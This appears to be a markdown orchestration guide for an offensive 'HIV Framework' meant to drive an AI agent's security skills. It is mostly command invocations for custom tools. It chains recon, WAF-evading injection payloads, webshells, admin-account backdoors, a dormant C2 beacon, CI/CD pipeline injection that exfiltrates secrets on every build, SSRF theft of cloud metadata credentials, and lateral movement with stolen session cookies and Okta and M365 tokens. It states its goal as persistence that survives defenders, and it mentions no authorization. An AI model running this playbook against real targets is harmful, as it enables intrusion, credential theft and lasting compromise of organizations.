# HIV Framework — Master Integration Orchestrator

> **HIV (Host Infiltration Vector) Framework**  
> Biological metaphor mapped to adversarial attack lifecycle.  
> Each stage maps to specific skills, tools, and expected outputs.

---

## Architecture Overview

```
[Stage 1: gp120 Recon]
        ↓
[Stage 2: gp41 Initial Access]  ← receptor-typed decision tree
        ↓
[Stage 3: Reverse Transcriptase — Payload Transform]
        ↓
[Stage 4: Integration — Persistence]
        ↓
[Stage 5: Cell Hijack — Infrastructure Abuse]
        ↓
[Stage 6: Budding — Lateral Movement]
```

Each stage feeds the next. Outputs from Stage 1 determine the decision branch in Stage 2. WAF posture from Stage 1 determines mutation strategy in Stage 3. Persistence tiers from Stage 4 define fallback paths across all later stages.

---

## Stage 1 — gp120 Recon (Surface Receptor Mapping)

**Biological analogy:** HIV gp120 binds to CD4 receptors to identify susceptible cells. Stage 1 identifies target attack surface — what "receptors" (auth types, APIs, tech stacks, WAF posture) are exposed.

### Skills Invoked

| Skill | Purpose | Priority |
|-------|---------|----------|
| `web2-recon` | Subdomain enum, URL crawl, JS analysis, endpoint discovery | P0 — always first |
| `offensive-osint` | Org structure, employee data, ASN/IP ranges, leaked creds | P0 |
| `hunt-shadow-api` | Undocumented/zombie API surface discovery | P1 |
| `hunt-source-leak` | JS bundles, `.map` files, exposed repos, build artifacts | P1 |
| `hunt-spa-api` | SPA hidden backend API discovery from JS source | P1 |

### Tools Invoked

```bash
# Browser-fingerprinted recon — bypasses bot detection on asset discovery
python rat_ghost.py --target https://TARGET \
  --mode recon \
  --fingerprint chrome-latest \
  --output stage1_surface.json

# JS source discovery with ghost browser
python rat_ghost.py --target https://TARGET \
  --mode js-harvest \
  --depth 3 \
  --extract-endpoints \
  --output stage1_endpoints.json

# QUIC/H3 probe to detect CDN, WAF, server identity
python rat_h3.py --target TARGET \
  --probe headers \
  --output stage1_h3_probe.json
```

### Recon Checklist

```
[ ] Subdomain enumeration complete (web2-recon)
[ ] JS endpoints extracted (hunt-spa-api + rat_ghost.py)
[ ] Auth mechanism identified (login form / JWT / OAuth / SAML / API key)
[ ] WAF vendor fingerprinted (rat_ghost.py headers, CF-Ray, X-Amz-Cf-Id, etc.)
[ ] Tech stack identified (X-Powered-By, response patterns, JS frameworks)
[ ] API surface mapped (REST / GraphQL / gRPC / WebSocket)
[ ] Source leaks checked (hunt-source-leak)
[ ] Shadow APIs identified (hunt-shadow-api — check .js bundles for undocumented routes)
[ ] Rate limiting posture assessed (passive — count headers, Retry-After)
[ ] OOB connectivity confirmed (rat_oob.py — verify callbacks reach your infra)
```

### Output: Target Receptor Map

```json
{
  "target": "TARGET",
  "auth_receptors": ["jwt", "oauth2", "session-cookie"],
  "injection_receptors": ["graphql", "rest-api", "file-upload"],
  "waf": {"vendor": "cloudflare", "bypass_difficulty": "medium"},
  "tech_stack": ["node.js", "react", "postgresql"],
  "api_surface": {"rest": 47, "graphql": 1, "websocket": 2},
  "source_leaks": ["api_keys in app.bundle.js", ".env exposed at /.env.bak"],
  "persistence_candidates": ["subdomain_takeover: 2 candidates", "cicd: github-actions exposed"],
  "stage2_receptor_type": "AUTH+INJECTION"
}
```

**Feed this JSON into Stage 2 decision tree.**

---

## Stage 2 — gp41 Initial Access (Receptor-Typed Entry)

**Biological analogy:** HIV gp41 mediates membrane fusion after gp120 receptor binding. Stage 2 selects the attack vector based on which receptors were identified in Stage 1.

### Decision Tree

```
Stage 1 receptor_type →
│
├── AUTH receptor detected
│   ├── JWT present         → hunt-jwt-crypto
│   ├── OAuth2 flow         → hunt-oauth
│   ├── SAML SSO            → hunt-saml
│   ├── MFA enforced        → hunt-mfa-bypass
│   └── Generic auth form   → hunt-auth-bypass
│
├── INJECTION receptor detected
│   ├── SQL patterns        → hunt-sqli
│   ├── Reflected input     → hunt-xss
│   ├── URL/IP fetch param  → hunt-ssrf
│   ├── Template engine     → hunt-ssti
│   ├── XML input           → hunt-xxe
│   └── Code execution path → hunt-rce
│
├── SESSION receptor detected
│   ├── CSRF tokens weak    → hunt-csrf
│   ├── Session fixation    → hunt-session
│   └── Account takeover    → hunt-ato
│
├── UPLOAD receptor detected
│   └── File upload present → hunt-file-upload
│
└── LOGIC receptor detected
    ├── Object references   → hunt-idor
    └── Business rules      → hunt-business-logic
```

### Per-Receptor Skill Details

#### AUTH Receptor

```bash
# JWT attacks — alg:none, weak secret, kid injection
# Follow: hunt-jwt-crypto skill workflow
python hiv_mutator.py --mode jwt \
  --token "eyJ..." \
  --attacks alg-none,weak-secret,kid-sqli \
  --output stage2_jwt_variants.json

# OAuth — state fixation, PKCE downgrade, redirect URI bypass
# Follow: hunt-oauth skill workflow
python rat_digest.py --target https://TARGET/oauth/token \
  --auth-probe \
  --output stage2_oauth_probe.json

# SAML — signature wrapping, XML injection
# Follow: hunt-saml skill workflow
python hiv_mutator.py --mode saml \
  --assertion "BASE64_ASSERTION" \
  --attacks wrapping,comment-injection,xpath \
  --output stage2_saml_variants.json

# MFA bypass — code reuse, backup code harvest, SIM swap indicators
# Follow: hunt-mfa-bypass skill workflow
```

#### INJECTION Receptor

```bash
# WAF-aware delivery for all injection payloads
python hiv_waf_fp.py --target https://TARGET \
  --waf cloudflare \
  --output stage2_waf_profile.json

# Mutate payloads based on WAF profile
python hiv_mutator.py --mode sqli \
  --waf-profile stage2_waf_profile.json \
  --output stage2_sqli_payloads.json

# H3 delivery — bypass WAF via QUIC
python rat_h3.py --target TARGET \
  --payload-file stage2_sqli_payloads.json \
  --endpoint /api/search \
  --output stage2_sqli_results.json

# SSRF — blind validation via OOB
python rat_oob.py --mode listener \
  --webhook-id ssrf-probe-$(date +%s) &

python hiv_mutator.py --mode ssrf \
  --callback-host OOB_HOST \
  --output stage2_ssrf_payloads.json
```

#### SESSION Receptor

```bash
# CSRF — token analysis, SameSite absence
# Follow: hunt-csrf skill workflow

# ATO — credential stuffing, password reset poisoning
# Follow: hunt-ato skill workflow
python rat_ghost.py --target https://TARGET/reset-password \
  --mode ato-probe \
  --host-header-inject \
  --output stage2_ato_probe.json
```

#### UPLOAD Receptor

```bash
# File upload — webshell, SVG XSS, MIME confusion
# Follow: hunt-file-upload skill workflow
python hiv_mutator.py --mode upload \
  --file-type php,jsp,aspx,svg,pdf \
  --waf-profile stage2_waf_profile.json \
  --output stage2_upload_payloads.json
```

#### LOGIC Receptor

```bash
# IDOR — object reference enumeration
# Follow: hunt-idor skill workflow

# Business logic — price manipulation, workflow bypass
# Follow: hunt-business-logic skill workflow
```

### Tools Summary for Stage 2

| Tool | Role |
|------|------|
| `rat_h3.py` | WAF bypass delivery via QUIC/HTTP3 |
| `rat_digest.py` | Auth probe, digest auth bypass |
| `hiv_mutator.py` | Payload mutation for WAF evasion |
| `hiv_waf_fp.py` | WAF vendor fingerprinting + bypass strategy |
| `rat_ghost.py` | Browser-fingerprinted delivery (bot-detect bypass) |
| `rat_oob.py` | Blind SSRF/XXE callback validation |

---

## Stage 3 — Reverse Transcriptase (Payload Transform Pipeline)

**Biological analogy:** HIV reverse transcriptase converts RNA to DNA — it transforms the payload into a form the host system will process. Stage 3 mutates payloads to evade detection.

### Primary Pipeline

```
[Raw payload] → hiv_waf_fp.py → [WAF profile] → hiv_mutator.py → [Mutated variants]
                                                       ↓
                                              [Ranked by evasion score]
                                                       ↓
                                              [Test delivery via rat_h3.py]
```

### Skills Invoked

| Skill | Purpose |
|-------|---------|
| `security-arsenal` | Source payloads: XSS, SQLi, SSTI, XXE, SSRF wordlists |
| `hunt-dispatch` | Auto-route to correct hunt-* skill based on signal type |

### Tool Invocations

```bash
# Step 1: Fingerprint WAF with full behavioral analysis
python hiv_waf_fp.py --target https://TARGET \
  --probe-depth full \
  --test-payloads security-arsenal/payloads/xss_baseline.txt \
  --output stage3_waf_fingerprint.json

# Step 2: Select mutation strategy based on WAF profile
# hiv_waf_fp.py output schema:
# { "waf": "cloudflare", "blocked_patterns": [...], "bypass_vectors": ["unicode", "case-variation", "chunked"] }

# Step 3: Mutate payloads using WAF-informed strategy
python hiv_mutator.py \
  --input security-arsenal/payloads/sqli_union.txt \
  --waf-profile stage3_waf_fingerprint.json \
  --strategy auto \
  --variants 50 \
  --output stage3_mutated_payloads.json

# Step 4: Rank variants by predicted evasion score
python hiv_mutator.py \
  --rank stage3_mutated_payloads.json \
  --output stage3_ranked_payloads.json

# Step 5: Validate top 10 variants via H3 delivery
python rat_h3.py --target TARGET \
  --payload-file stage3_ranked_payloads.json \
  --top 10 \
  --output stage3_validation_results.json
```

### Mutation Strategy Matrix

| WAF Vendor | Primary Strategy | Secondary Strategy | Notes |
|------------|-----------------|-------------------|-------|
| Cloudflare | Unicode normalization | Chunked encoding | CF rules are regex-based |
| AWS WAF | Case variation | URL double-encoding | Managed rules have gaps |
| Akamai | Comment insertion | Whitespace mutation | Header injection effective |
| Imperva | Null byte injection | Parameter pollution | Legacy rule sets |
| ModSecurity | CRLF injection | Multipart confusion | CRS version dependent |
| F5 BIG-IP | Protocol-level | HTTP/2 desync | Requires rat_h3.py |
| Fastly | VCL bypass | Cache key manipulation | hunt-cache-poison synergy |
| None detected | Full payload | All variants | No evasion needed |

### Integration with hunt-dispatch

```bash
# hunt-dispatch auto-routes to correct skill based on signal
# Feed stage3 output signals back through dispatch for skill selection
# Dispatch reads: stage3_validation_results.json → routes to hunt-sqli / hunt-xss / etc.

# Example dispatch trigger:
# if "error in SQL syntax" in response → escalate to hunt-sqli full workflow
# if "reflected in DOM" → escalate to hunt-xss DOM XSS path
# if "callback received" → escalate to hunt-ssrf blind SSRF path
```

---

## Stage 4 — Integration (Persistence Establishment)

**Biological analogy:** HIV integrase inserts viral DNA into the host genome — permanent, dormant, activated on demand. Stage 4 establishes persistence that survives defender responses.

### Persistence Tier Decision Tree

```
Available persistence vectors →
│
├── Tier 1: Active persistence (immediate, high-risk)
│   ├── Webshell planted           → rat_oob.py verify callback
│   ├── Admin account created      → rat_oob.py verify login
│   └── Backdoor API key           → rat_digest.py verify auth
│
├── Tier 2: Passive persistence (dormant, lower-risk)
│   ├── Subdomain takeover         → hunt-subdomain workflow
│   ├── OAuth app authorized       → hunt-oauth persistence path
│   └── API key in leaked source   → hunt-source-leak harvest
│
├── Tier 3: Supply chain persistence (high-value, long-lived)
│   ├── CI/CD pipeline injection   → hunt-cicd workflow
│   ├── npm/pip package shadow     → supply-chain-attack-recon
│   └── GitHub Actions compromise  → hunt-cicd + rat_oob.py verify
│
└── Tier 4: Protocol persistence (invisible, infrastructure)
    ├── DNS persistence            → hunt-subdomain + rat_oob.py
    └── Dormant C2 beacon          → hiv_beacon.py
```

### Skills Invoked

| Skill | Persistence Type | Survival Rating |
|-------|-----------------|-----------------|
| `hunt-subdomain` | Subdomain takeover → DNS-level persistence | High — survives app patching |
| `hunt-cicd` | CI/CD pipeline backdoor → supply chain persistence | Very High — survives credential rotation |
| `hunt-source-leak` | Harvest persisted secrets | Medium — depends on rotation |
| `hunt-oauth` | OAuth app as persistence channel | High — survives password reset |

### Tool Invocations

```bash
# Verify persistence is active after planting
python rat_oob.py --mode verify \
  --webhook-id persistence-check \
  --timeout 300 \
  --output stage4_persistence_verify.json

# Plant dormant C2 beacon (activates on signal)
python hiv_beacon.py \
  --mode plant \
  --target https://TARGET \
  --beacon-interval 86400 \
  --activation-key "$(openssl rand -hex 16)" \
  --output stage4_beacon_config.json

# Verify subdomain takeover viability
# (From hunt-subdomain workflow output)
python rat_oob.py --mode dns-verify \
  --subdomain dangling.TARGET \
  --output stage4_subdomain_verify.json

# Establish CI/CD persistence
# (From hunt-cicd workflow — inject into GitHub Actions)
python rat_oob.py --mode cicd-callback \
  --pipeline-id TARGET_PIPELINE \
  --output stage4_cicd_verify.json
```

### Persistence Tier Selection Logic

```
IF subdomain_takeover_available:
    → Deploy Tier 2 first (low-risk, long-lived)
    → Plant DNS-level redirect to controlled infrastructure

IF cicd_access_gained:
    → Deploy Tier 3 (highest value)
    → Inject into pipeline: secrets exfil on every build

IF webshell_planted:
    → Tier 1 active, but HIGH detection risk
    → Immediately deploy Tier 2+ as backup
    → Use hiv_beacon.py as Tier 4 fallback

IF oauth_app_authorized:
    → Tier 2 — survives password reset
    → Token refresh maintains access indefinitely

ALWAYS:
    → Deploy hiv_beacon.py as Tier 4 fallback
    → Verify with rat_oob.py before declaring persistence established
```

---

## Stage 5 — Cell Hijack (Infrastructure Abuse)

**Biological analogy:** Infected cell produces viral proteins, commandeering cellular machinery. Stage 5 abuses internal infrastructure reached via initial access.

### Skills Invoked

| Skill | Abuse Target | Priority |
|-------|-------------|---------|
| `hunt-ssrf` | Internal service enumeration via SSRF | P0 |
| `hunt-cloud-misconfig` | Cloud metadata, IAM, S3, storage abuse | P0 |
| `hunt-k8s` | Kubernetes API, kubelet, etcd abuse | P1 |
| `hunt-cicd` | Pipeline secrets extraction, runner abuse | P1 |
| `hunt-graphql` | Internal GraphQL introspection, batching abuse | P1 |

### Tool Invocations

```bash
# Internal service access via SSRF + H3 bypass
python rat_h3.py --target TARGET \
  --mode ssrf-pivot \
  --internal-targets "169.254.169.254,kubernetes.default.svc,10.0.0.0/8" \
  --ssrf-param url \
  --output stage5_internal_access.json

# Blind SSRF validation via OOB callback
python rat_oob.py --mode listener \
  --webhook-id internal-probe \
  --protocols http,dns \
  --output stage5_oob_callbacks.json

# Cloud metadata service access (AWS IMDSv1/v2, GCP, Azure)
python rat_h3.py --target TARGET \
  --mode metadata-pivot \
  --imds-endpoints "169.254.169.254/latest/meta-data/" \
  --output stage5_metadata_access.json

# Kubernetes API enumeration via SSRF
# Target: https://kubernetes.default.svc/api/v1/namespaces
python rat_oob.py --mode k8s-verify \
  --k8s-api kubernetes.default.svc \
  --output stage5_k8s_access.json
```

### Infrastructure Abuse Map

```
SSRF confirmed →
├── Cloud metadata (169.254.169.254)
│   ├── AWS: IAM role credentials → hunt-cloud-misconfig
│   ├── GCP: service account token → hunt-cloud-misconfig  
│   └── Azure: managed identity → hunt-cloud-misconfig
│
├── Internal Kubernetes
│   ├── kubelet API (10250) → hunt-k8s
│   ├── etcd (2379) → hunt-k8s
│   └── K8s API server → hunt-k8s
│
├── Internal HTTP services
│   ├── Elasticsearch → data exfil
│   ├── Redis → cache poisoning / RCE
│   ├── MongoDB → data exfil
│   └── Jenkins/CI → hunt-cicd
│
└── Internal GraphQL
    ├── Introspection enabled → hunt-graphql full workflow
    ├── Batch query abuse → hunt-graphql
    └── Mutation access → hunt-graphql
```

### rat_h3.py SSRF Pivot Command Reference

```bash
# SSRF via QUIC to bypass WAF-enforced SSRF protections
python rat_h3.py \
  --target TARGET \
  --mode ssrf-pivot \
  --pivot-param "url" \
  --pivot-endpoint "/api/fetch" \
  --internal-ip 169.254.169.254 \
  --internal-path "/latest/meta-data/iam/security-credentials/" \
  --h3-only \
  --output stage5_aws_creds.json

# Blind SSRF with DNS callback
python rat_oob.py --mode dns-listener \
  --label stage5-ssrf-blind \
  --timeout 600 &

python rat_h3.py \
  --target TARGET \
  --mode ssrf-dns \
  --callback-domain OOB_DOMAIN \
  --output stage5_dns_callbacks.json
```

---

## Stage 6 — Budding (Lateral Movement)

**Biological analogy:** New viral particles bud from infected cell to infect neighbors. Stage 6 moves laterally across accounts, services, and organizations using access gained in prior stages.

### Skills Invoked

| Skill | Movement Type | Target |
|-------|-------------|--------|
| `hunt-idor` | Horizontal privilege — access other users' objects | Same application |
| `hunt-ato` | Account takeover chain — pivot to other accounts | Same application |
| `hunt-oauth` | OAuth token pivot — access linked services | Cross-service |
| `cloud-iam-deep` | IAM privilege escalation chain | Cloud infrastructure |
| `m365-entra-attack` | Entra ID pivot — M365 tenant traversal | Microsoft 365 |
| `okta-attack` | Okta IdP pivot — all apps behind Okta | Enterprise SSO |

### Tool Invocations

```bash
# Session pivot using ghost browser — impersonate victim session
python rat_ghost.py \
  --mode session-pivot \
  --cookie "stolen_session_cookie" \
  --target-user victim@target.com \
  --enumerate-objects \
  --output stage6_session_pivot.json

# Auth pivot using digest auth
python rat_digest.py \
  --mode pivot \
  --credentials stage4_persistence_verify.json \
  --target-endpoints stage1_endpoints.json \
  --output stage6_auth_pivot.json

# IDOR enumeration across user objects
# (Feed from hunt-idor workflow)
python rat_ghost.py \
  --mode idor-enumerate \
  --base-id 1000 \
  --range 10000 \
  --object-type "user,order,document,report" \
  --output stage6_idor_results.json

# OAuth pivot to linked services
# (Feed from hunt-oauth workflow — list authorized apps)
python rat_digest.py \
  --mode oauth-pivot \
  --token "ACCESS_TOKEN" \
  --enumerate-linked-services \
  --output stage6_oauth_pivot.json
```

### Lateral Movement Priority Matrix

```
Current access level →

Compromised User Account:
  → IDOR to other user data (hunt-idor)
  → OAuth apps to linked services (hunt-oauth)
  → If admin: cloud-iam-deep for infra pivot

Compromised Admin Account:
  → cloud-iam-deep (immediate escalation)
  → m365-entra-attack (if M365 present)
  → okta-attack (if Okta IdP present)
  → hunt-cicd (access pipeline secrets)

Compromised Service Account:
  → cloud-iam-deep (IAM role chaining)
  → hunt-k8s (if K8s service account)
  → hunt-ssrf (lateral to internal services)

Token-Only Access (API key, JWT):
  → hunt-shadow-api (find undocumented scope)
  → hunt-idor (object enumeration)
  → hunt-graphql (introspection for hidden fields)
```

### Cloud IAM Lateral Movement

```bash
# AWS: IAM privilege escalation via role chaining
# Follow: cloud-iam-deep skill workflow
# Enumerate assumable roles from compromised credentials
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/TARGET_ROLE \
  --role-session-name hiv-pivot

# Verify new role privileges
python rat_oob.py --mode iam-verify \
  --credentials stage6_new_role.json \
  --output stage6_iam_pivot.json

# M365: Entra ID lateral movement  
# Follow: m365-entra-attack skill workflow
# Token pivot: Graph API access with compromised token

# Okta: All apps via Okta session pivot
# Follow: okta-attack skill workflow
# Session cookie → access all Okta-protected applications
python rat_ghost.py \
  --mode okta-pivot \
  --okta-session "OKTA_SESSION_TOKEN" \
  --enumerate-apps \
  --output stage6_okta_apps.json
```

---

## Full Lifecycle Command Reference

### Quick-Start Invocation Sequence

```bash
# Stage 1: Surface mapping
python rat_ghost.py --target $TARGET --mode recon --output s1_surface.json
python rat_h3.py --target $TARGET --probe headers --output s1_h3.json

# Stage 2: Initial access (AUTH example)
python hiv_waf_fp.py --target $TARGET --output s2_waf.json
python hiv_mutator.py --mode jwt --waf-profile s2_waf.json --output s2_jwt.json
python rat_h3.py --target $TARGET --payload-file s2_jwt.json --output s2_results.json

# Stage 3: Payload transform
python hiv_waf_fp.py --target $TARGET --probe-depth full --output s3_waf_full.json
python hiv_mutator.py --input payloads/sqli.txt --waf-profile s3_waf_full.json --output s3_mutated.json

# Stage 4: Persistence
python hiv_beacon.py --mode plant --target $TARGET --output s4_beacon.json
python rat_oob.py --mode verify --webhook-id persist-check --output s4_verify.json

# Stage 5: Infrastructure abuse
python rat_h3.py --target $TARGET --mode ssrf-pivot --output s5_internal.json
python rat_oob.py --mode listener --webhook-id s5-ssrf --output s5_callbacks.json

# Stage 6: Lateral movement
python rat_ghost.py --mode session-pivot --cookie $SESSION --output s6_pivot.json
python rat_digest.py --mode pivot --credentials s4_verify.json --output s6_auth.json
```

---

## Skill × Stage Cross-Reference

| Skill | S1 | S2 | S3 | S4 | S5 | S6 |
|-------|----|----|----|----|----|----|
| web2-recon | ✓ | | | | | |
| offensive-osint | ✓ | | | | | |
| hunt-shadow-api | ✓ | | | | | |
| hunt-source-leak | ✓ | | | ✓ | | |
| hunt-spa-api | ✓ | | | | | |
| hunt-auth-bypass | | ✓ | | | | |
| hunt-jwt-crypto | | ✓ | | | | ✓ |
| hunt-oauth | | ✓ | | ✓ | | ✓ |
| hunt-saml | | ✓ | | | | ✓ |
| hunt-mfa-bypass | | ✓ | | | | |
| hunt-sqli | | ✓ | ✓ | | | |
| hunt-xss | | ✓ | ✓ | | | |
| hunt-ssrf | | ✓ | | | ✓ | |
| hunt-ssti | | ✓ | ✓ | | | |
| hunt-xxe | | ✓ | ✓ | | | |
| hunt-rce | | ✓ | | ✓ | | |
| hunt-session | | ✓ | | | | ✓ |
| hunt-csrf | | ✓ | | | | |
| hunt-ato | | ✓ | | | | ✓ |
| hunt-file-upload | | ✓ | | ✓ | | |
| hunt-business-logic | | ✓ | | | | |
| hunt-idor | | ✓ | | | | ✓ |
| security-arsenal | | | ✓ | | | |
| hunt-dispatch | | | ✓ | | | |
| hunt-subdomain | | | | ✓ | | |
| hunt-cicd | | | | ✓ | ✓ | |
| hunt-cloud-misconfig | | | | | ✓ | |
| hunt-k8s | | | | | ✓ | |
| hunt-graphql | | | | | ✓ | ✓ |
| cloud-iam-deep | | | | | | ✓ |
| m365-entra-attack | | | | | | ✓ |
| okta-attack | | | | | | ✓ |
| hunt-cache-poison | | | ✓ | | | |
| hunt-websocket | | ✓ | | | ✓ | |
| hunt-grpc | | ✓ | | | ✓ | |
| hunt-host-header | | ✓ | | | | |
| hunt-dom | | ✓ | ✓ | | | |
| hunt-nosqli | | ✓ | ✓ | | | |
| hunt-deserialization | | ✓ | ✓ | ✓ | | |
| hunt-http-smuggling | | ✓ | ✓ | | ✓ | |

---

*HIV Framework Integration Orchestrator v1.0*  
*Generated for Security--Skill repo integration*
